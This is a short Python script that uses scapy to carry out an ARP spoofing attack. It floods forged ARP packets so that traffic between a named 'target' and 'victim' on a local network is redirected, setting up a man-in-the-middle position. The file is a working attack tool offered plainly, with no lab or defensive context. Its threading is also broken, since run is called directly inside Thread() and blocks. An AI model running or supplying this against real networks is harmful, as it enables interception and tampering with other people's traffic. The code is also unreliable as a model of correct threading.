# -*- coding: utf-8 -*-

from threading import Thread
from scapy.layers.l2 import getmacbyip
from scapy.all import Ether, ARP, sendp
from IPy import IP

# --------------------------------------------------------------------------
#
# --------------------------------------------------------------------------

def run(target, victim, interface):

    tmac = getmacbyip(target)
    p = Ether(dst=tmac)/ARP(op="who-has", psrc=victim, pdst=target)
    try:
        while 1:
            sendp(p, iface=interface, verbose=0)
    except KeyboardInterrupt:
        pass


def run_attack(config):

    evaluate_address(config.target)
    evaluate_address(config.victim)

    if len(config.interface) > 0:
        iface = str(config.interface[0])

        target = config.target
        victim = config.victim

        try:
            t1 = Thread(run(target, victim, iface))
            t2 = Thread(run(victim, target, iface))

            t1.start()
            t2.start()

        except KeyboardInterrupt:
            pass


def evaluate_address(ip_address):
    try:
        ip = IP(ip_address)
    except ValueError:
        raise TypeError("'%s' is not a valid ip address" % ip_address)